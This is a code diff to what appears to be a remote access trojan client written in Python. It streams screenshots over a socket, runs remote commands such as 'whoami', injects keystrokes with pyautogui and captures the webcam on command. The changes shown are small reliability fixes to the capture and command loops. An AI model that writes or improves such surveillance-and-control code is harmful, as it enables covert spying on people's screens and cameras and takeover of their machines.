@@ -33,10 +33,12 @@ def capture_frames():
     while True:
         try:
             img = screen_capture.take_screenshot()
+            if not img:
+                continue
             if frame_queue.full():
                 frame_queue.get()
             frame_queue.put(img)
-            time.sleep(1/60)
+            time.sleep(1/20)
         except Exception as e:
             print("[client] Erreur capture:", e)
 
@@ -44,8 +46,9 @@ def stream_screen(s):
     try:
         while True:
             try:
-                frame = frame_queue.get()
-                send_base64(s, frame)
+                frame = frame_queue.get(timeout=1)
+                if frame:
+                    send_base64(s, frame)
             except Exception as e:
                 print("[client] Erreur envoi stream:", e)
                 break
@@ -64,7 +67,7 @@ def start_client():
 
     while True:
         try:
-            command = receive_data(s_cmd).decode()
+            command = s_cmd.recv(1024).decode()
 
             if command == "shell":
                 result = subprocess.getoutput("whoami")
@@ -118,7 +121,6 @@ def start_client():
                     pyautogui.press(specials[text])
                 else:
                     pyautogui.write(text)
-
 
             elif command == "webcam":
                 img = webcam.capture_webcam()
